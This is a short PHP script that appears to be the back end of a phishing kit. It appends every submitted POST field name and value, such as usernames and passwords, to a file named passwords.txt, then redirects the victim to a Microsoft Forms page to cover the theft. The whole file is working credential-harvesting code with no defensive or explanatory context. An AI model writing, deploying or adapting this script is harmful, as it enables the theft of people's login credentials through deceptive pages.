<?php
header
('location:');
$handle=fopen("passwords.txt", "a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"-");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://forms.office.com/Pages/DesignPageV2.aspx?linkorigin=Bot&prevpage=templatesall&linkreferrer=Others&templateorigin=portal&origin=NeoPortalPage&tryout=true&totid=db46981c-a06e-4d0a-8ff5-eb915567e41d&subpage=design");
exit;
?>